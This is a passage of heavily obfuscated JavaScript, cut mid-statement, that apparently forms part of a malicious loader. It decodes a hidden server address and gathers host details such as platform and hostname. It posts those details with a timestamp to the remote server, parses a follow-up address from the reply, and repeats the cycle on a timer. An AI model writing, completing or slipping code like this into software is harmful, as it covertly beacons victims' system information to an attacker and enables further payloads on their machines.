a8='',a9='',aa='',ab=0x0;ab<0x4;ab++)a8+=a7[0x2*ab]+a7[0x2*ab+0x1],a9+=a7[0x8+0x2*ab]+a7[0x9+0x2*ab],aa+=a7[0x10+ab];return m(y[aR(0x1c)+aR(0xd)+'g'](0x1))+m(a9+a8+aa)+$+'4';})(a2),a4=c(G);let a5=a3+aU(0x43);a5+=aV(0x46),s[a4](a5,(a6,a7,a8)=>{a6?a2<0x1&&C(0x1):(a9=>{const aW=a1,aX=a1,aY=a1,aZ=a1,b0=a1;if(0x0==a9[aW(0x8)+'ch'](aX(0x4a))){let aa='';try{for(let ab=0x3;ab<a9[aX(0x50)+'th'];ab++)aa+=a9[ab];arr=m(aa),arr=arr[aX(0x0)+'t'](','),b=m(y[aZ(0x1c)+b0(0xd)+'g'](0x1))+arr[0x0]+$+'4',v=arr[0x1];}catch(ac){return 0x0;}return 0x1;}return 0x0;})(a8)>0x0&&(I(),E());});},I=async()=>{const b1=a1,b2=a1,b3=a1,b4=a1,b5=a1;B=h,'d'==u[0x0]&&(B=B+'+'+d[c(b1(0x6c)+b1(0x3a)+b3(0x4f))]);let a2=b2(0x1e);try{a2+=o[c(b3(0x31)+b1(0x24))][0x1];}catch(a3){}L(b2(0x10),a2);},L=async(a3,a4)=>{const b6=a1,b7=a1,b8=a1,b9=a1,a5={};a5['ts']=f,a5[b6(0xf)]=v,a5[b6(0x53)]=B,a5['ss']=a3,a5['cc']=a4;const a6=a5,a7={[surl]:''+b+c(b8(0xa)+b8(0x55)),[sForm]:a6};try{s[D](a7,(a8,a9,aa)=>{});}catch(a8){}},E=async()=>await new Promise((a2,a3)=>{q();});var P=0x0;const _=async()=>{const ba=a1,bb=a1,bc=a1;try{f=Date[ba(0x63)]()[bb(0x68)+ba(0x4c)](),await C(0x0);}catch(a2){}};_();let K=setInterval(()=>{(P+=0x1)<0x3?_():clearInterval(K);},0x96640);

